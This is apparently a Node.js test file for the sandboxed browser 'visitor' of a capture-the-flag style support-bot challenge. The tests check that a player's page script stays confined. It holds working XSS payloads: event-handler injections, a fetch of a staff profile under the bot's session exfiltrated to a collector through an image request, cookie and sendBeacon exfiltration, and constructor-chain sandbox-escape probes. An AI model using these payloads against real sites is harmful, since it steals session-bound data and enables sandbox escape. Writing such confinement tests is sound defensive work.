// The browser visitor of the support bot (C03 part B): a page with a player's script is run, the script can reach the shop (with the bot's session) and the collector (tagged)
// and nothing else, it cannot read the session cookie, it cannot reach the bot's own process, and it cannot hang the visit. The "shop" here is a small server of the test.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { createBrowserVisitor } from '../src/browser.mjs';

const COOKIE = 'abcdefghij.klmnopqrstuvwxyz';

function listen(handler) {
  return new Promise((resolve) => {
    const hits = [];
    const server = http.createServer((req, res) => { hits.push({ method: req.method, url: req.url, headers: req.headers }); handler(req, res, hits); });
    server.listen(0, '127.0.0.1', () => resolve({ server, hits, origin: `http://127.0.0.1:${server.address().port}` }));
  });
}
const html = (body) => `<!doctype html><html><body><div class="body">${body}</div></body></html>`;

async function world(pageBody, { shopExtra } = {}) {
  const collector = await listen((req, res) => { res.writeHead(200, { 'content-type': 'text/plain', 'access-control-allow-origin': '*' }); res.end('ok'); });
  const outsider = await listen((req, res) => { res.writeHead(200); res.end('x'); });
  const shop = await listen((req, res) => {
    const url = new URL(req.url, 'http://x');
    if (shopExtra?.(req, res, url)) return;
    if (url.pathname === '/staff/tickets/1') { res.writeHead(200, { 'content-type': 'text/html' }); return res.end(html(pageBody({ collector: collector.origin, outsider: outsider.origin }))); }
    if (url.pathname === '/staff/api/agent-profile') {
      const ok = /(^|; )vm_sess=abcdefghij\.klmnopqrstuvwxyz/.test(req.headers.cookie || '');
      res.writeHead(ok ? 200 : 401, { 'content-type': 'application/json' });
      return res.end(JSON.stringify(ok ? { console_key: 'KEY-123' } : { error: 'no session' }));
    }
    res.writeHead(404, { 'content-type': 'text/plain' }); res.end('no');
  });
  const visit = createBrowserVisitor({ origins: [shop.origin, collector.origin], dwellMs: 400 });
  const go = (opts = {}) => visit(`${shop.origin}/staff/tickets/1`, { timeoutMs: 12000, session: COOKIE, ...opts });
  const close = () => { for (const w of [shop, collector, outsider]) w.server.close(); };
  return { shop, collector, outsider, go, close };
}
const dParam = (hit) => new URL(hit.url, 'http://x').searchParams.get('d');

test('a script tag runs under the bot session, reads the profile and reaches the collector with the visit tag', async () => {
  const w = await world(({ collector }) => `<script>fetch('/staff/api/agent-profile').then(r=>r.text()).then(t=>{ new Image().src='${collector}/c/x?d='+encodeURIComponent(t); });</script>`);
  try {
    const r = await w.go();
    assert.equal(r.ok, true);
    const hit = w.collector.hits.find((h) => h.url.startsWith('/c/x'));
    assert.ok(hit, 'the collector was reached');
    assert.match(dParam(hit), /KEY-123/);
    assert.match(hit.headers['x-vm-visit'], /^v-/);
    assert.equal(w.shop.hits.find((h) => h.url === '/staff/api/agent-profile').headers.cookie, `vm_sess=${COOKIE}`);
  } finally { w.close(); }
});

test('the payloads of the hints run: img onerror, svg onload, autofocus onfocus, onmouseover and onclick', async () => {
  const w = await world(({ collector }) => [
    `<img src=x onerror="new Image().src='${collector}/c/a'">`,
    `<svg onload="new Image().src='${collector}/c/b'"></svg>`,
    `<input autofocus onfocus="new Image().src='${collector}/c/c'">`,
    `<p onmouseover="new Image().src='${collector}/c/d'">hover</p>`,
    `<button onclick="new Image().src='${collector}/c/e'">go</button>`,
    `<a href="javascript:new Image().src='${collector}/c/f'">link</a>`,
  ].join('\n'));
  try {
    await w.go();
    const got = new Set(w.collector.hits.map((h) => h.url.split('?')[0]));
    for (const p of ['/c/a', '/c/b', '/c/c', '/c/d', '/c/e']) assert.ok(got.has(p), `${p} was reached`);
  } finally { w.close(); }
});

test('XMLHttpRequest and sendBeacon work and carry the tag', async () => {
  const w = await world(({ collector }) => `<script>var x=new XMLHttpRequest(); x.open('GET','/staff/api/agent-profile'); x.onload=function(){ navigator.sendBeacon('${collector}/c/beacon', x.responseText); }; x.send();</script>`);
  try {
    await w.go();
    const hit = w.collector.hits.find((h) => h.url === '/c/beacon');
    assert.ok(hit);
    assert.equal(hit.method, 'POST');
    assert.match(hit.headers['x-vm-visit'], /^v-/);
  } finally { w.close(); }
});

test('the session cookie is HttpOnly: document.cookie does not show it', async () => {
  const w = await world(({ collector }) => `<script>new Image().src='${collector}/c/ck?d='+encodeURIComponent('['+document.cookie+']');</script>`);
  try {
    await w.go();
    const hit = w.collector.hits.find((h) => h.url.startsWith('/c/ck'));
    assert.equal(dParam(hit), '[]');
  } finally { w.close(); }
});

test('a request to any origin that is not the shop or the collector is never made', async () => {
  const w = await world(({ outsider }) => `<script>fetch('${outsider}/steal').catch(function(){}); new Image().src='${outsider}/img'; var x=new XMLHttpRequest(); x.open('GET','${outsider}/xhr'); x.send(); try { new WebSocket('ws://127.0.0.1:1/'); } catch(e) {}</script><img src="${'{OUT}'}">`);
  try {
    await w.go();
    assert.equal(w.outsider.hits.length, 0);
  } finally { w.close(); }
});

test('the visit tag cannot be replaced by the page', async () => {
  const w = await world(({ collector }) => `<script>fetch('${collector}/c/t', { headers: { 'x-vm-visit': 'forged' } });</script>`);
  try {
    await w.go();
    const hit = w.collector.hits.find((h) => h.url === '/c/t');
    assert.match(hit.headers['x-vm-visit'], /^v-/);
  } finally { w.close(); }
});

test('the page cannot climb from its objects to the process of the bot', async () => {
  const probe = `(function(){ var out=[]; var things={ fetch: window.fetch, xhr: XMLHttpRequest, log: console.log, beacon: navigator.sendBeacon, setTimeout: window.setTimeout, create: document.createElement, add: window.addEventListener, ImageSrc: Object.getOwnPropertyDescriptor(HTMLImageElement.prototype,'src').set };
    Object.keys(things).forEach(function(k){ try { var C=things[k].constructor; var p=C('return typeof process')(); out.push(k+':'+p); } catch(e) { out.push(k+':blocked'); } });
    try { var e0; try { null.x } catch(e) { e0=e } out.push('err:'+e0.constructor.constructor('return typeof process')()); } catch(e) { out.push('err:blocked'); }
    try { var e1; try { document.createElement('1bad') } catch(e) { e1=e } out.push('dom:'+e1.constructor.constructor('return typeof process')()); } catch(e) { out.push('dom:blocked'); }
    try { out.push('proto:'+Object.getPrototypeOf(setTimeout).constructor('return typeof process')()); } catch(e) { out.push('proto:blocked'); }
    try { var f=function(){}; var AsyncF=Object.getPrototypeOf(async function(){}).constructor; out.push('async:'+AsyncF('return typeof process')()); } catch(e) { out.push('async:blocked'); }
    try { var st; try { null.x } catch(e) { st=e } var oe; try { document.createElement('1bad') } catch(e) { oe=e } var E=oe.constructor; E.prepareStackTrace=function(_,c){ return typeof c[0].getThis()+typeof c[0].getFunction(); }; out.push('trace:'+new E().stack); } catch(e) { out.push('trace:blocked'); }
    return out.join(','); })()`;
  const w = await world(({ collector }) => `<script>new Image().src='${collector}/c/esc?d='+encodeURIComponent(${probe});</script>`);
  try {
    await w.go();
    const hit = w.collector.hits.find((h) => h.url.startsWith('/c/esc'));
    const seen = dParam(hit);
    assert.ok(seen, 'the probe ran');
    assert.doesNotMatch(seen, /(fetch|xhr|log|beacon|setTimeout|create|add|ImageSrc|err|dom|proto|async):(object|function)/, `a page object led to the outer realm: ${seen}`);
    assert.match(seen, /setTimeout:(undefined|blocked)/);
  } finally { w.close(); }
});

test('a script that never returns is stopped at the time limit and the next visit still works', async () => {
  const w = await world(() => '<script>while(true){}</script>');
  try {
    const t0 = Date.now();
    const r = await w.go({ timeoutMs: 2500 });
    assert.equal(r.ok, false);
    assert.equal(r.timedOut, true);
    assert.ok(Date.now() - t0 < 6000);
    const w2 = await world(() => '<p>fine</p>');
    try { assert.equal((await w2.go()).ok, true); } finally { w2.close(); }
  } finally { w.close(); }
});

test('a page that is not HTML, or an error status, ends the visit without running anything', async () => {
  const w = await world(() => '', { shopExtra: (req, res, url) => { if (url.pathname === '/staff/tickets/1') { res.writeHead(500, { 'content-type': 'text/html' }); res.end('<script>fetch("x")</script>'); return true; } return false; } });
  try {
    const r = await w.go();
    assert.equal(r.status, 500);
    assert.equal(w.collector.hits.length, 0);
  } finally { w.close(); }
});
